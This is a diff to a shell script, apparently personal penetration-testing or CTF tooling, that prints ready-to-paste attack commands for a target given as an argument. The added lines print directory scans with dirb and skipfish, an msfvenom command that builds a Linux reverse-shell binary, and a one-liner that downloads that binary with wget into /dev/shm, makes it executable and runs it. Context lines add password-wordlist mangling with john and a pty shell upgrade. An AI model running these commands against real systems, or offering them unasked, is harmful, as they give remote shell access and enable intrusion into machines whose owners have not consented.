@@ -4,6 +4,19 @@ printf "\n"
 printf "cewl -d 2 -m 5 -w words.txt http://$1 2>/dev/null;john --wordlist=words.txt --rules:Tuned --stdout > mangled_words.txt"
 printf "\n\n"
 
+printf "dirb http://$1"
+printf "\n\n"
+
+cat << EOF 
+skipfish -YO -o ~/skipfish http://$1
+EOF
+
+printf "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > rev_shell"
+printf "\n\n"
+
+printf "/usr/bin/wget http://$1:$2/rev_shell -O /dev/shm/rev_shell;chmod 777 /dev/shm/rev_shell;/dev/shm/rev_shell"
+printf "\n\n"
+
 printf "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
 printf "\n\n"
 
